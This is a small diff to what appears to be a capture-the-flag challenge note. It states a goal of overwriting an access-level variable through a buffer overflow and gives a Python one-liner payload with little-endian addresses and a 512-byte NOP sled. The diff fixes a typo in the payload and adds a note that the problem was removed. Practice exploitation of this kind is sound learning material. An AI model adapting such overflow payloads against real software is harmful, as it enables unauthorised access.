@@ -1,3 +1,6 @@
+NOTE: THIS PROBLEM GOT REMOVED.
+
+
 Goal:
 Overwrite followings by buffer overflow
 - accesslevel to 0x023FBA8B
@@ -6,4 +9,4 @@ Overwrite followings by buffer overflow
 0x804851f
 
 Payload:
-ython -c "print '\x1b\x85\x04\x08'+'\n'+'\x90'*512+'\x8b\xba\x3f\x02'+'\x90'*4+'\x64\xa0\x04\x08'"
+python -c "print '\x1b\x85\x04\x08'+'\n'+'\x90'*512+'\x8b\xba\x3f\x02'+'\x90'*4+'\x64\xa0\x04\x08'"
